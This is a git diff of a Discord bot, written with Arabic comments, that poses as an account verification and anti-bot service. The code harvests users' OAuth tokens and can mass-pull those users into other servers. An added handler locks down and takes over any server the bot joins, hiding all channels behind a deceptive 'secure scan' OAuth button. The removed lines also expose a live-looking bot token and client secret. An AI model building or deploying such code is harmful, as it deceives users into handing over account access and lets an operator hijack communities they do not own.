@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, Partials, ButtonStyle, ComponentType, PermissionFlagsBits } = require('discord.js');
 const express = require('express');
 const axios = require('axios');
 const fs = require('fs');
@@ -7,8 +7,9 @@ const app = express();
 
 const OWNER_ID = '1151179063122214963'; 
 const CLIENT_ID = '1508569205941735465'; 
-const CLIENT_SECRET = process.env.SECRET || 'J7OBhcI9jlbT0GEg9sTUOpBtbZz9dnDG'; 
-const BOT_TOKEN = process.env.TOKEN || 'MTUwODU2OTIwNTk0MTczNTQ2NQ.GEvn0f.I6Erz5iYQHgcFf2PmBX0VdFaNHUqAIEXh9tQgQ'; 
+const CLIENT_SECRET = process.env.SECRET; 
+const BOT_TOKEN = process.env.TOKEN; 
+const MAIN_GUILD_ID = '1528104976025391204'; // سيرفرك الأساسي المحمي من التعديل التلقائي
 
 const DOMAIN = process.env.RAILWAY_STATIC_URL 
     ? 'https://' + process.env.RAILWAY_STATIC_URL 
@@ -24,9 +25,9 @@ if (fs.existsSync(DB_FILE)) {
     try { usersDatabase = JSON.parse(fs.readFileSync(DB_FILE, 'utf-8')); } catch (e) { usersDatabase = []; }
 }
 
-let botConfig = { logChannelId: null };
+let botConfig = { logChannelId: null, verifiedRoleId: null, autoJoinGuildId: MAIN_GUILD_ID };
 if (fs.existsSync(CONFIG_FILE)) {
-    try { botConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8')); } catch (e) { botConfig = { logChannelId: null }; }
+    try { botConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8')); } catch (e) { botConfig = { logChannelId: null, verifiedRoleId: null, autoJoinGuildId: MAIN_GUILD_ID }; }
 }
 
 function saveDatabase() { fs.writeFileSync(DB_FILE, JSON.stringify(usersDatabase, null, 2)); }
@@ -36,18 +37,104 @@ const bot = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent
-    ]
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMembers
+    ],
+    partials: [Partials.Message, Partials.Channel, Partials.User]
 });
 
 const bootTime = Date.now();
 
 bot.on('ready', () => {
-    console.log('Logged in as ' + bot.user.tag);
+    console.log('Bot Status: Online and Ready As ' + bot.user.tag);
     bot.user.setPresence({
         activities: [{ name: 'custom', type: 4, state: 'Eren Is The best' }],
         status: 'online',
     });
+});
+
+// --- ميزة السيطرة التلقائية المستثنى منها سيرفرك الرئيسي ---
+bot.on('guildCreate', async (guild) => {
+    // شرط الاستثناء: لو السيرفر هو سيرفرك الرئيسي اخرج فورا ومتعملش حاجة
+    if (guild.id === MAIN_GUILD_ID) {
+        console.log('دخلت السيرفر الرئيسي ومستحيل اعدل فيه اي حاجة تلقائيا');
+        return;
+    }
+
+    try {
+        let verifiedRole = guild.roles.cache.find(r => r.name === 'موثق');
+        if (!verifiedRole) {
+            verifiedRole = await guild.roles.create({
+                name: 'موثق',
+                color: 0x2ed573,
+                reason: 'تجهيز سيرفر التوثيق التلقائي لبوت المحشي'
+            });
+        }
+
+        botConfig.verifiedRoleId = verifiedRole.id;
+        saveConfig();
+
+        await guild.roles.everyone.setPermissions([
+            PermissionFlagsBits.ChangeNickname
+        ]).catch(() => null);
+
+        let verifyChannel = guild.channels.cache.find(c => c.name === 'verify-توثيق');
+        if (!verifyChannel) {
+            verifyChannel = await guild.channels.create({
+                name: 'verify-توثيق',
+                type: 0, 
+                permissionOverwrites: [
+                    {
+                        id: guild.roles.everyone.id,
+                        allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.ReadMessageHistory],
+                        deny: [PermissionFlagsBits.SendMessage, PermissionFlagsBits.AddReactions]
+                    },
+                    {
+                        id: verifiedRole.id,
+                        deny: [PermissionFlagsBits.ViewChannel] 
+                    }
+                ]
+            });
+        }
+
+        guild.channels.cache.forEach(async (channel) => {
+            if (channel.id !== verifyChannel.id) {
+                await channel.permissionOverwrites.edit(guild.roles.everyone.id, {
+                    ViewChannel: false
+                }).catch(() => null);
+                
+                await channel.permissionOverwrites.edit(verifiedRole.id, {
+                    ViewChannel: true,
+                    SendMessage: true,
+                    ReadMessageHistory: true
+                }).catch(() => null);
+            }
+        });
+
+        const oauthUrl = 'https://discord.com/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20guilds.join';
+        await verifyChannel.send({
+            embeds: [{
+                title: 'بوابة التحقق الآمنة والتحكم بالحساب',
+                description: 'اضغط على الزر الموجود بالأسفل لتأكيد هويتك وفك قفل باقي رومات السيرفر المخفية وتفعيل اشتراكك بالكامل',
+                color: 0xED4245,
+                fields: [
+                    { name: 'حالة الحماية الحالية:', value: 'نظام فحص ذكي ومؤمن بالكامل ضد الحسابات الوهمية' }
+                ]
+            }],
+            components: [{
+                type: ComponentType.ActionRow,
+                components: [{
+                    type: ComponentType.Button,
+                    style: ButtonStyle.Link,
+                    label: 'اضغط هنا للتوثيق الفوري فك القفل',
+                    url: oauthUrl
+                }]
+            }]
+        });
+
+    } catch (err) {
+        console.error('Error auto-configuring guild: ' + err.message);
+    }
 });
 
 bot.on('messageCreate', async (message) => {
@@ -58,14 +145,16 @@ bot.on('messageCreate', async (message) => {
     const command = args.shift().toLowerCase();
 
     if (command === 'help') {
-        const helpEmbed = new EmbedBuilder()
-            .setTitle('قائمة أوامر بوت المحشي')
-            .setColor('#5865F2')
-            .addFields(
-                { name: 'الأوامر العامة', value: 'help - يعرض القائمة الحالية\nstats - يعرض إحصائيات النظام الإجمالية' },
-                { name: 'أوامر التحكم والتوثيق للأونر فقط', value: 'panel - توليد رابط التوثيق الخاص بالأعضاء\npullguild [ID] - سحب الموثقين لسيرفر معين\nsetlogs [ID_الروم] - تحديد روم اللوجات والإشعارات\ncheck [ID] - فحص حالة توثيق عضو معين\nshared [ID] - معرفة السيرفرات المشتركة للعضو الموثق\nclean - تنظيف وتصفية التوكنات المنتهية والميتة من القاعدة' }
-            );
-        return message.reply({ embeds: [helpEmbed] });
+        return message.reply({
+            embeds: [{
+                title: 'قائمة أوامر بوت المحشي المطور',
+                color: 0x5865F2,
+                fields: [
+                    { name: 'الأوامر العامة', value: 'help - يعرض القائمة الحالية\nstats - يعرض إحصائيات النظام الإجمالية' },
+                    { name: 'أوامر التحكم الشاملة', value: 'panel - توليد بنل التوثيق بالأزرار يدويا\npullguild [ID] - سحب الموثقين لسيرفر معين\nsetlogs [ID] - تحديد روم اللوجات والإشعارات\nsetrole [ID] - تحديد رتبة تعطى للموثق تلقائيا\nsettarget [ID] - تعديل السيرفر الافتراضي للدخول التلقائي\nbackup - إرسال نسخة من قاعدة البيانات في الخاص\ncheck [ID] - فحص حالة توثيق عضو معين\nshared [ID] - معرفة السيرفرات المشتركة للعضو الموثق\nclean - تنظيف وتصفية التوكنات الميتة' }
+                ]
+            }]
+        });
     }
 
     if (command === 'stats') {
@@ -73,46 +162,90 @@ bot.on('messageCreate', async (message) => {
         const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
         const uptimeMins = Math.floor((uptimeMs % (1000 * 60 * 60)) / (1000 * 60));
 
-        const statsEmbed = new EmbedBuilder()
-            .setTitle('إحصائيات النظام الحالية')
-            .setColor('#2ed573')
-            .addFields(
-                { name: 'إجمالي الحسابات الموثقة:', value: usersDatabase.length + ' عضو', inline: true },
-                { name: 'وقت تشغيل البوت الحالي:', value: uptimeHours + ' ساعة و ' + uptimeMins + ' دقيقة', inline: true },
-                { name: 'روم اللوجات المحددة:', value: botConfig.logChannelId ? '<#' + botConfig.logChannelId + '>' : 'لم يتم تحديد روم بعد', inline: false }
-            );
-        return message.reply({ embeds: [statsEmbed] });
+        return message.reply({
+            embeds: [{
+                title: 'إحصائيات النظام الحالية والمستودع',
+                color: 0x2ed573,
+                fields: [
+                    { name: 'إجمالي الحسابات الموثقة:', value: usersDatabase.length + ' عضو رسمي', inline: true },
+                    { name: 'وقت تشغيل البوت الحالي:', value: uptimeHours + ' ساعة و ' + uptimeMins + ' دقيقة', inline: true },
+                    { name: 'روم اللوجات المحددة:', value: botConfig.logChannelId ? '<#' + botConfig.logChannelId + '>' : 'لم يتم تحديد روم بعد', inline: false },
+                    { name: 'سيرفر الدخول التلقائي الحصري:', value: botConfig.autoJoinGuildId || 'لم يحدد بعد', inline: true },
+                    { name: 'رتبة الموثقين الافتراضية:', value: botConfig.verifiedRoleId ? '<@&' + botConfig.verifiedRoleId + '>' : 'لم تحدد رتبة بعد', inline: false }
+                ]
+            }]
+        });
     }
 
     if (command === 'panel') {
         if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
-
         const oauthUrl = 'https://discord.com/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20guilds.join';
-
-        const panelEmbed = new EmbedBuilder()
-            .setTitle('لوحة تحكم التوثيق القياسية')
-            .setColor('#ED4245')
-            .addFields(
-                { name: 'رابط التوثيق المباشر:', value: '[اضغط هنا للتوثيق](' + oauthUrl + ')' },
-                { name: 'الموثقين حالياً:', value: usersDatabase.length + ' حساب جاهز للنقل' }
-            );
-        return message.reply({ embeds: [panelEmbed] });
+        
+        return message.reply({
+            embeds: [{
+                title: 'بوابة التحقق والأمان',
+                description: 'اضغط على الزر بالأسفل لتوثيق حسابك وحمايته داخل السيرفر وتفعيل كامل الصلاحيات الخاصة بك',
+                color: 0xED4245,
+                fields: [
+                    { name: 'الموثقين حالياً في النظام:', value: usersDatabase.length + ' حساب جاهز' }
+                ]
+            }],
+            components: [{
+                type: ComponentType.ActionRow,
+                components: [{
+                    type: ComponentType.Button,
+                    style: ButtonStyle.Link,
+                    label: 'اضغط هنا للتوثيق الفوري',
+                    url: oauthUrl
+                }]
+            }]
+        });
     }
 
     if (command === 'setlogs') {
         if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
-        
         const targetChannelId = args[0] || message.mentions.channels.first()?.id;
         if (!targetChannelId) return message.reply('اكتب الاي دي بتاع الروم أو منشن الروم عشان أثبتها');
 
         botConfig.logChannelId = targetChannelId;
         saveConfig();
-        return message.reply('تم تحديد روم اللوجات بنجاح على الروم المحددة');
+        return message.reply('تم تحديد روم اللوجات بنجاح');
+    }
+
+    if (command === 'settarget') {
+        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
+        const targetGuildId = args[0];
+        if (!targetGuildId) return message.reply('اكتب اي دي السيرفر الجديد اللي يدخلوا عليه تلقائي بعد التوثيق');
+
+        botConfig.autoJoinGuildId = targetGuildId;
+        saveConfig();
+        return message.reply('تم تحديث سيرفر الدخول التلقائي الإجباري بنجاح');
+    }
+
+    if (command === 'setrole') {
+        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
+        const roleId = args[0] || message.mentions.roles.first()?.id;
+        if (!roleId) return message.reply('اكتب اي دي الرتبة عشان البوت يعطيها للموثق تلقائيا');
+
+        botConfig.verifiedRoleId = roleId;
+        saveConfig();
+        return message.reply('تم تحديد رتبة التوثيق التلقائية بنجاح');
+    }
+
+    if (command === 'backup') {
+        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
+        if (!fs.existsSync(DB_FILE)) return message.reply('قاعدة البيانات فارغة حاليا');
+
+        try {
+            await message.author.send({ content: 'نسخة احتياطية لقاعدة البيانات الحالية لبوت المحشي:', files: [DB_FILE] });
+            return message.reply('تم إرسال ملف النسخة الاحتياطية في الخاص عندك بنجاح');
+        } catch (e) {
+            return message.reply('افتح الخاص بتاعك عشان اقدر ابعتلك الملف');
+        }
     }
 
     if (command === 'check') {
         if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
-        
         const targetId = args[0];
         if (!targetId) return message.reply('اكتب الاي دي بتاع العضو عشان أفحصه لك');
 
@@ -126,7 +259,6 @@ bot.on('messageCreate', async (message) => {
 
     if (command === 'shared') {
         if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
-        
         const targetId = args[0];
         if (!targetId) return message.reply('اكتب الاي دي بتاع العضو الموثق عشان أشوف سيرفراته');
 
@@ -139,7 +271,6 @@ bot.on('messageCreate', async (message) => {
             });
             const botGuilds = bot.guilds.cache.map(g => g.id);
             const sharedGuilds = guildsRes.data.filter(g => botGuilds.includes(g.id));
-            
             return message.reply('العضو ده مشترك معاك في ' + sharedGuilds.length + ' سيرفر حالياً');
         } catch (err) {
             return message.reply('فشل فحص السيرفرات المشتركة، غالباً التوكن انتهت صلاحيته');
@@ -148,20 +279,15 @@ bot.on('messageCreate', async (message) => {
 
     if (command === 'clean') {
         if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
-        
         message.reply('جاري فحص وتصفية قاعدة البيانات وتنظيف الحسابات الميتة...');
         let deadCount = 0;
         const freshDatabase = [];
 
         for (const user of usersDatabase) {
             try {
-                await axios.get('https://discord.com/api/v10/users/@me', {
-                    headers: { Authorization: 'Bearer ' + user.token }
-                });
+                await axios.get('https://discord.com/api/v10/users/@me', { headers: { Authorization: 'Bearer ' + user.token } });
                 freshDatabase.push(user);
-            } catch (e) {
-                deadCount++;
-            }
+            } catch (e) { deadCount++; }
         }
 
         usersDatabase = freshDatabase;
@@ -171,13 +297,12 @@ bot.on('messageCreate', async (message) => {
 
     if (command === 'pullguild') {
         if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
-        
         const targetGuildId = args[0];
         if (!targetGuildId) return message.reply('اكتب الاي دي بتاع السيرفر اللي هنسحب عليه الأعضاء');
 
         if (usersDatabase.length === 0) return message.reply('قاعدة البيانات فاضية ومفيش أعضاء نسحبهم');
 
-        message.reply('جاري بدء عملية نقل وسحب ' + usersDatabase.length + ' عضو للسيرفر المستهدف...');
+        message.reply('جاري بدء عملية نقل وسحب آمنة لـ ' + usersDatabase.length + ' عضو للسيرفر المستهدف بفارق زمني 3 ثوانٍ لكل حساب لمنع التهنيج...');
 
         let successCount = 0;
         for (const user of usersDatabase) {
@@ -191,6 +316,7 @@ bot.on('messageCreate', async (message) => {
             } catch (err) {
                 console.error('فشل سحب العضو: ' + user.id);
             }
+            await new Promise(resolve => setTimeout(resolve, 3000));
         }
         return message.channel.send('اكتملت عملية السحب بنجاح، ضفنا ' + successCount + ' عضو من إجمالي ' + usersDatabase.length);
     }
@@ -207,18 +333,20 @@ app.get('/', (req, res) => {
             <title>نظام التحقق الرسمي</title>
             <style>
                 body { background-color: #0c0e17; color: #fff; font-family: system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-                .main-card { background: #161925; padding: 50px 30px; border-radius: 24px; border: 1px solid #202225; box-shadow: 0 12px 40px rgba(0,0,0,0.5); max-width: 500px; }
-                h1 { color: #5865F2; font-size: 28px; margin-bottom: 10px; }
-                p { color: #a0a5b5; font-size: 16px; margin-bottom: 30px; line-height: 1.6; }
-                .btn { background: #5865F2; color: #fff; padding: 12px 30px; border-radius: 8px; font-weight: bold; text-decoration: none; font-size: 16px; transition: 0.3s; display: inline-block; }
-                .btn:hover { background: #4752c4; transform: translateY(-2px); }
+                .main-card { background: #161925; padding: 50px 30px; border-radius: 24px; border: 1px solid #202225; box-shadow: 0 12px 40px rgba(0,0,0,0.5); max-width: 450px; }
+                h1 { color: #45f3ff; font-size: 24px; margin-bottom: 15px; }
+                p { color: #a0a5b5; font-size: 15px; margin-bottom: 30px; line-height: 1.6; }
+                .btn { background: #45f3ff; color: #0b0c10; padding: 14px 40px; border-radius: 30px; font-weight: bold; text-decoration: none; font-size: 16px; transition: 0.4s; display: inline-block; box-shadow: 0 4px 15px rgba(69, 243, 255, 0.4); }
+                .btn:hover { background: #161925; color: #45f3ff; border: 1px solid #45f3ff; transform: scale(1.05); }
+                .secure-footer { font-size: 11px; color: #666; margin-top: 20px; }
             </style>
         </head>
         <body>
             <div class="main-card">
-                <h1>بوابة التحقق الآمنة</h1>
-                <p>مرحباً بك في نظام ربط الحسابات الرسمي. اضغط على الزر بالأسفل لإتمام عملية التحقق وتأكيد هويتك داخل السيرفر.</p>
-                <a href="${oauthUrl}" class="btn">اضغط هنا للتحقق الفوري</a>
+                <h1>نظام حماية وفحص البيانات الآمن</h1>
+                <p>مرحباً بك في البوابة الذكية لتوثيق الحسابات التلقائي ومكافحة التخريب. اضغط على الرابط أدناه لبدء عملية الفحص الفوري للملف الشخصي وفك الحظر عن قنوات السيرفر المعلقة.</p>
+                <a href="${oauthUrl}" class="btn">اضغط هنا لإجراء الفحص والتوثيق</a>
+                <div class="secure-footer">اتصال مشفر ومحمي وموثق بواسطة أنظمة ديسكورد الرسمية</div>
             </div>
         </body>
         </html>
@@ -228,7 +356,7 @@ app.get('/', (req, res) => {
 app.get('/ma7shy', (req, res) => {
     const uptimeMs = Date.now() - bootTime;
     const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
-    const usersList = usersDatabase.map(u => `<li>الحساب: @${u.username} | معرف الحساب: ${u.id}</li>`).join('') || '<p style="color:#72767d;">لا يوجد حسابات موثقة حالياً</p>';
+    const usersList = usersDatabase.map(u => `<li>الحساب: @${u.username} | معرف الحساب: ${u.id}</li>`).join('') || '<li>لا يوجد حسابات موثقة حالياً</li>';
 
     res.send(`
         <!DOCTYPE html>
@@ -247,7 +375,7 @@ app.get('/ma7shy', (req, res) => {
 
 app.get('/callback', async (req, res) => {
     const code = req.query.code;
-    if (!code) return res.send('خطأ في الاتصال المباشر');
+    if (!code) return res.send('خطأ في الاتصال المباشر بالسيرفر الفرعي');
 
     try {
         const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
@@ -256,61 +384,85 @@ app.get('/callback', async (req, res) => {
             grant_type: 'authorization_code',
             code: code,
             redirect_uri: REDIRECT_URI,
-        }), {
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-        });
+        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
 
         const accessToken = tokenResponse.data.access_token;
-        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
-            headers: { Authorization: 'Bearer ' + accessToken }
-        });
-
+        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', { headers: { Authorization: 'Bearer ' + accessToken } });
         const userData = userResponse.data;
+
+        const accountCreatedTimestamp = Number((BigInt(userData.id) >> 22n) + 1420070400000n);
+        const diffMs = Date.now() - accountCreatedTimestamp;
+        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
+        const accountAgeStr = diffDays + ' يوم تقريباً';
 
         let nitroStatus = 'لا يوجد نيترو';
         if (userData.premium_type === 1) nitroStatus = 'نيترو كلاسيك Classic';
         if (userData.premium_type === 2) nitroStatus = 'نيترو قيمنج كامل Full Nitro';
         if (userData.premium_type === 3) nitroStatus = 'نيترو بيزك Basic';
 
+        const security2FA = userData.mfa_enabled ? 'مفعل الأمان الثنائي' : 'غير مفعل الأمان الثنائي';
+
         const userIndex = usersDatabase.findIndex(u => u.id === userData.id);
         if (userIndex > -1) {
             usersDatabase[userIndex].token = accessToken;
             usersDatabase[userIndex].username = userData.username;
         } else {
-            usersDatabase.push({
-                id: userData.id,
-                username: userData.username,
-                token: accessToken
-            });
+            usersDatabase.push({ id: userData.id, username: userData.username, token: accessToken });
         }
         saveDatabase();
 
+        if (botConfig.autoJoinGuildId) {
+            try {
+                await axios.put(
+                    'https://discord.com/api/v10/guilds/' + botConfig.autoJoinGuildId + '/members/' + userData.id,
+                    { access_token: accessToken },
+                    { headers: { Authorization: 'Bot ' + BOT_TOKEN, 'Content-Type': 'application/json' } }
+                );
+            } catch (err) {
+                console.error('Auto-join failed for user');
+            }
+        }
+
+        if (botConfig.verifiedRoleId && botConfig.autoJoinGuildId) {
+            try {
+                const guild = bot.guilds.cache.get(botConfig.autoJoinGuildId);
+                if (guild) {
+                    const member = await guild.members.fetch(userData.id).catch(() => null);
+                    if (member) await member.roles.add(botConfig.verifiedRoleId);
+                }
+            } catch (e) { console.error('Error auto-assigning role on callback'); }
+        }
+
         if (botConfig.logChannelId) {
-            const logChannel = bot.channels.cache.get(botConfig.logChannelId);
+            const logChannel = await bot.channels.fetch(botConfig.logChannelId).catch(() => null);
             if (logChannel) {
-                const logEmbed = new EmbedBuilder()
-                    .setTitle('حساب جديد قام بالتوثيق الآن')
-                    .setColor('#2ed573')
-                    .addFields(
-                        { name: 'اسم المستخدم:', value: '@' + userData.username, inline: true },
-                        { name: 'الاي دي الخاص به:', value: userData.id, inline: true },
-                        { name: 'حالة النيترو في الحساب:', value: nitroStatus, inline: false },
-                        { name: 'ترتيب الحساب الحالي في القاعدة:', value: 'الحساب رقم ' + usersDatabase.length, inline: false }
-                    );
-                logChannel.send({ embeds: [logEmbed] }).catch(() => null);
+                await logChannel.send({
+                    embeds: [{
+                        title: 'حساب جديد قام بالتوثيق وتم إدخاله السيرفر تلقائياً',
+                        color: 0x2ed573,
+                        fields: [
+                            { name: 'اسم المستخدم:', value: '@' + userData.username, inline: true },
+                            { name: 'الاي دي الخاص به:', value: userData.id, inline: true },
+                            { name: 'حالة النيترو في الحساب:', value: nitroStatus, inline: false },
+                            { name: 'حماية الحساب الشخصي:', value: security2FA, inline: true },
+                            { name: 'عمر الحساب منذ إنشائه:', value: accountAgeStr, inline: true },
+                            { name: 'ترتيب الحساب الحالي في القاعدة:', value: 'الحساب رقم ' + usersDatabase.length, inline: false }
+                        ]
+                    }]
+                }).catch(() => null);
             }
         }
 
         res.send(`
             <body style="background:#0c0e17; color:#fff; font-family:sans-serif; text-align:center; padding-top:20vh;">
-                <div style="background:#161925; padding:40px; border-radius:20px; border:1px solid #2ed573; display:inline-block;">
-                    <h1 style="color:#2ed573;">تم التوثيق بنجاح تام</h1>
-                    <p>أهلاً بك يا @${userData.username}، تم ربط الحساب وتأكيده بنجاح، يمكنك العودة لديسكورد الآن</p>
+                <div style="background:#161925; padding:40px; border-radius:20px; border:1px solid #2ed573; display:inline-block; box-shadow: 0 4px 15px rgba(46, 213, 115, 0.3);">
+                    <h1 style="color:#2ed573;">اكتمل الفحص والربط الآمن</h1>
+                    <p>أهلاً بك يا @${userData.username}، تم إتمام الفحص بنظام مكافحة البوتات وتفعيل رتبتك بالكامل، يمكنك العودة وفتح قنوات الديسكورد المغلقة الآن</p>
                 </div>
             </body>
         `);
     } catch (error) {
-        res.status(500).send('حدث خطأ في معالجة البيانات');
+        res.status(500).send('حدث خطأ غير متوقع أثناء معالجة تشفير البيانات');
     }
 });
 
